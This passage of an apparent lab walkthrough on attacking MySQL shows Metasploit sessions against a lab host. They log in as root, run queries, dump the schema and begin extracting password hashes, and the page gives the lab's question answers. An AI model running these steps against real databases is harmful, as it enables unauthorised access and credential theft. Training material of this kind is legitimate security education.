</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">4</span><span><span style="color:#f5e0dc">RHOSTS</span> <span style="color:#89dceb;font-weight:bold">=</span>&gt; 10.10.151.196
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">5</span><span>msf6 auxiliary<span style="color:#89dceb;font-weight:bold">(</span>admin/mysql/mysql_sql<span style="color:#89dceb;font-weight:bold">)</span> &gt; <span style="color:#89dceb">set</span> PASSWORD password
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">6</span><span><span style="color:#f5e0dc">PASSWORD</span> <span style="color:#89dceb;font-weight:bold">=</span>&gt; password</span></span></code></pre></div>
<br>
<p>Run the exploit. By default it will test with the <code>select version()</code> command, what result does this give you?</p>






<pre tabindex="0"><code>5.7.29-0ubuntu0.18.04.1</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>msf6 auxiliary<span style="color:#89dceb;font-weight:bold">(</span>admin/mysql/mysql_sql<span style="color:#89dceb;font-weight:bold">)</span> &gt; run
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span><span style="color:#89dceb;font-weight:bold">[</span>*<span style="color:#89dceb;font-weight:bold">]</span> Running module against 10.10.151.196
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">4</span><span><span style="color:#89dceb;font-weight:bold">[</span>*<span style="color:#89dceb;font-weight:bold">]</span> 10.10.151.196:3306 - Sending statement: <span style="color:#a6e3a1">&#39;select version()&#39;</span>...
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">5</span><span><span style="color:#89dceb;font-weight:bold">[</span>*<span style="color:#89dceb;font-weight:bold">]</span> 10.10.151.196:3306 - | 5.7.29-0ubuntu0.18.04.1 |
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">6</span><span><span style="color:#89dceb;font-weight:bold">[</span>*<span style="color:#89dceb;font-weight:bold">]</span> Auxiliary module execution completed
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">7</span><span>msf6 auxiliary<span style="color:#89dceb;font-weight:bold">(</span>admin/mysql/mysql_sql<span style="color:#89dceb;font-weight:bold">)</span> &gt;</span></span></code></pre></div>
<br>
<p>Great! We know that our exploit is landing as planned. Let&rsquo;s try to gain some more ambitious information. Change the sql option to show databases. How many databases are returned?</p>






<pre tabindex="0"><code>4</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>msf6 auxiliary<span style="color:#89dceb;font-weight:bold">(</span>admin/mysql/mysql_sql<span style="color:#89dceb;font-weight:bold">)</span> &gt; <span style="color:#89dceb">set</span> SQL show databases
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span><span style="color:#f5e0dc">SQL</span> <span style="color:#89dceb;font-weight:bold">=</span>&gt; show databases
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>msf6 auxiliary<span style="color:#89dceb;font-weight:bold">(</span>admin/mysql/mysql_sql<span style="color:#89dceb;font-weight:bold">)</span> &gt; options
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>Module options <span style="color:#89dceb;font-weight:bold">(</span>auxiliary/admin/mysql/mysql_sql<span style="color:#89dceb;font-weight:bold">)</span>:
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>Name Current Setting Required Description
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>---
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>PASSWORD password no The password <span style="color:#cba6f7">for</span> the specified username
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>RHOSTS 10.10.151.196 yes The target host<span style="color:#89dceb;font-weight:bold">(</span>s<span style="color:#89dceb;font-weight:bold">)</span>, see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasplo
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span>it.html
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span>RPORT <span style="color:#fab387">3306</span> yes The target port <span style="color:#89dceb;font-weight:bold">(</span>TCP<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">15</span><span>SQL show databases yes The SQL to execute.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">16</span><span>USERNAME root no The username to authenticate as
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">17</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">18</span><span>View the full module info with the info, or info -d command.</span></span></code></pre></div>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>msf6 auxiliary<span style="color:#89dceb;font-weight:bold">(</span>admin/mysql/mysql_sql<span style="color:#89dceb;font-weight:bold">)</span> &gt; run
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span><span style="color:#89dceb;font-weight:bold">[</span>*<span style="color:#89dceb;font-weight:bold">]</span> Running module against 10.10.151.196
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">4</span><span><span style="color:#89dceb;font-weight:bold">[</span>*<span style="color:#89dceb;font-weight:bold">]</span> 10.10.151.196:3306 - Sending statement: <span style="color:#a6e3a1">&#39;show databases&#39;</span>...
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">5</span><span><span style="color:#89dceb;font-weight:bold">[</span>*<span style="color:#89dceb;font-weight:bold">]</span> 10.10.151.196:3306 - | information_schema |
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">6</span><span><span style="color:#89dceb;font-weight:bold">[</span>*<span style="color:#89dceb;font-weight:bold">]</span> 10.10.151.196:3306 - | mysql |
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">7</span><span><span style="color:#89dceb;font-weight:bold">[</span>*<span style="color:#89dceb;font-weight:bold">]</span> 10.10.151.196:3306 - | performance_schema |
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">8</span><span><span style="color:#89dceb;font-weight:bold">[</span>*<span style="color:#89dceb;font-weight:bold">]</span> 10.10.151.196:3306 - | sys |
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">9</span><span><span style="color:#89dceb;font-weight:bold">[</span>*<span style="color:#89dceb;font-weight:bold">]</span> Auxiliary module execution completed</span></span></code></pre></div>
<br>
<h4 id="exploiting-mysql">Exploiting MySQL</h4>
<p>Take a sanity check before moving on to try and exploit the database fully. We know:</p>
<ol>
<li>MySQL server credentials</li>
<li>The version of MySQL running</li>
<li>The number of Databases, and their names.</li>
</ol>
<br>
<p><em>Schema</em>
In MySQL, physically, a <code>schema</code> is synonymous with a <code>database</code>. You can substitute the keyword schema instead of database in MySQL SQL syntax, for example using <code>CREATE SCHEMA</code> instead of <code>CREATE DATABASE</code>. Some other database products draw a distinction.</p>
<p><em>Hashes</em>
Hashes are the product of a cryptographic algorithm to turn a variable length input into a fixed length output. In MySQL hashes can be used in different ways, for instance to index data into a hash table. Each hash has a unique ID that serves as a pointer to the original data.</p>
<br>
<p>First, let&rsquo;s search for and select the <code>mysql_schemadump</code> module. What&rsquo;s the module&rsquo;s full name?</p>






<pre tabindex="0"><code>auxiliary/scanner/mysql/mysql_schemadump</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>msf6 auxiliary<span style="color:#89dceb;font-weight:bold">(</span>admin/mysql/mysql_sql<span style="color:#89dceb;font-weight:bold">)</span> &gt; search mysql_schemadump
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span><span style="color:#6c7086;font-style:italic"># Matching Modules</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">4</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">5</span><span><span style="color:#6c7086;font-style:italic"># Name Disclosure Date Rank Check Description</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">6</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">7</span><span>---
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">8</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">9</span><span><span style="color:#fab387">0</span> auxiliary/scanner/mysql/mysql_schemadump normal No MYSQL Schema Dump</span></span></code></pre></div>
<br>
<p>Great! Now, you&rsquo;ve done this a few times by now so I&rsquo;ll let you take it from here. Set the relevant options, run the exploit. What&rsquo;s the name of the last table that gets dumped?</p>






<pre tabindex="0"><code>x$waits_global_by_latency</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>msf6 auxiliary<span style="color:#89dceb;font-weight:bold">(</span>scanner/mysql/mysql_schemadump<span style="color:#89dceb;font-weight:bold">)</span> &gt; options
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>Module options <span style="color:#89dceb;font-weight:bold">(</span>auxiliary/scanner/mysql/mysql_schemadump<span style="color:#89dceb;font-weight:bold">)</span>:
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>Name Current Setting Required Description
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>---
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>DISPLAY_RESULTS <span style="color:#89dceb">true</span> yes Display the Results to the Screen
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>PASSWORD no The password <span style="color:#cba6f7">for</span> the specified username
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>RHOSTS yes The target host<span style="color:#89dceb;font-weight:bold">(</span>s<span style="color:#89dceb;font-weight:bold">)</span>, see https://docs.metasploit.com/docs/using-metasploit/basics/using-m
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>etasploit.html
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span>RPORT <span style="color:#fab387">3306</span> yes The target port <span style="color:#89dceb;font-weight:bold">(</span>TCP<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span>THREADS <span style="color:#fab387">1</span> yes The number of concurrent threads <span style="color:#89dceb;font-weight:bold">(</span>max one per host<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">15</span><span>USERNAME no The username to authenticate as
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">16</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">17</span><span>View the full module info with the info, or info -d command.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">18</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">19</span><span>msf6 auxiliary<span style="color:#89dceb;font-weight:bold">(</span>scanner/mysql/mysql_schemadump<span style="color:#89dceb;font-weight:bold">)</span> &gt; <span style="color:#89dceb">set</span> USERNAME root
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">20</span><span><span style="color:#f5e0dc">USERNAME</span> <span style="color:#89dceb;font-weight:bold">=</span>&gt; root
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">21</span><span>msf6 auxiliary<span style="color:#89dceb;font-weight:bold">(</span>scanner/mysql/mysql_schemadump<span style="color:#89dceb;font-weight:bold">)</span> &gt; <span style="color:#89dceb">set</span> RHOSTS 10.10.151.196
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">22</span><span><span style="color:#f5e0dc">RHOSTS</span> <span style="color:#89dceb;font-weight:bold">=</span>&gt; 10.10.151.196
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">23</span><span>msf6 auxiliary<span style="color:#89dceb;font-weight:bold">(</span>scanner/mysql/mysql_schemadump<span style="color:#89dceb;font-weight:bold">)</span> &gt; <span style="color:#89dceb">set</span> PASSWORD password
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">24</span><span><span style="color:#f5e0dc">PASSWORD</span> <span style="color:#89dceb;font-weight:bold">=</span>&gt; password</span></span></code></pre></div>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>- TableName: x<span style="color:#f5e0dc">$waits_global_by_latency</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>  Columns:
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>  - ColumnName: events
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>    ColumnType: varchar<span style="color:#89dceb;font-weight:bold">(</span>128<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>  - ColumnName: total
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>    ColumnType: bigint<span style="color:#89dceb;font-weight:bold">(</span>20<span style="color:#89dceb;font-weight:bold">)</span> unsigned
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>  - ColumnName: total_latency
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>    ColumnType: bigint<span style="color:#89dceb;font-weight:bold">(</span>20<span style="color:#89dceb;font-weight:bold">)</span> unsigned
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>  - ColumnName: avg_latency
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>    ColumnType: bigint<span style="color:#89dceb;font-weight:bold">(</span>20<span style="color:#89dceb;font-weight:bold">)</span> unsigned
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>  - ColumnName: max_latency
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>    ColumnType: bigint<span style="color:#89dceb;font-weight:bold">(</span>20<span style="color:#89dceb;font-weight:bold">)</span> unsigned
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span><span style="color:#89dceb;font-weight:bold">[</span>*<span style="color:#89dceb;font-weight:bold">]</span> 10.10.151.196:3306 - Scanned <span style="color:#fab387">1</span> of <span style="color:#fab387">1</span> hosts <span style="color:#89dceb;font-weight:bold">(</span>100% <span style="color:#89dceb">complete</span><span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">15</span><span><span style="color:#89dceb;font-weight:bold">[</span>*<span style="color:#89dceb;font-weight:bold">]</span> Auxiliary module execution completed
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">16</span><span>msf6 auxiliary<span style="color:#89dceb;font-weight:bold">(</span>scanner/mysql/mysql_schemadump<span style="color:#89dceb;font-weight:bold">)</span> &gt;</span></span></code></pre></div>
<br>
<p>Awesome, you have now dumped the tables, and column names of the whole database. But we can do one better&hellip; search for and select the mysql_hashdump module. What&rsquo;s the module&rsquo;s full name?</p>






<pre tabindex="0"><code>auxiliary/scanner/mysql/mysql_hashdump</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>msf6 auxiliary<span style="color:#89dceb;font-weight:bold">(</span>scanner/mysql/mysql_schemadump<span style="color:#89dceb;font-weight:bold">)</span> &gt; search mysql_hashdump
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span><span style="color:#6c7086;font-style:italic"># Matching Modules</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span><span style="color:#6c7086;font-style:italic"># Name Disclosure Date Rank Check Description</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>---
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span><span style="color:#fab387">0</span> auxiliary/scanner/mysql/mysql_hashdump normal No MYSQL Password Hashdump
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span><span style="color:#fab387">1</span> auxiliary/analyze/crack_databases normal No Password Cracker: Databases</span></span></code></pre></div>
<br>
<p>Again, I&rsquo;ll let you take it from here. Set the relevant options, run the exploit. What non-default user stands out to you?</p>






<pre tabindex="0"><code>carl</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>msf6 auxiliary<span style="color:#89dceb;font-weight:bold">(</span>scanner/mysql/mysql_hashdump<span style="color:#89dceb;font-weight:bold">)</span> &gt; options
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>Module options <span style="color:#89dceb;font-weight:bold">(</span>auxiliary/scanner/mysql/mysql_hashdump<span style="color:#89dceb;font-weight:bold">)</span>:
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>Name Current Setting Required Description
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>---
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>PASSWORD no The password <span style="color:#cba6f7">for</span> the specified username
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>RHOSTS yes The target host<span style="color:#89dceb;font-weight:bold">(</span>s<span style="color:#89dceb;font-weight:bold">)</span>, see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasplo
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>it.html
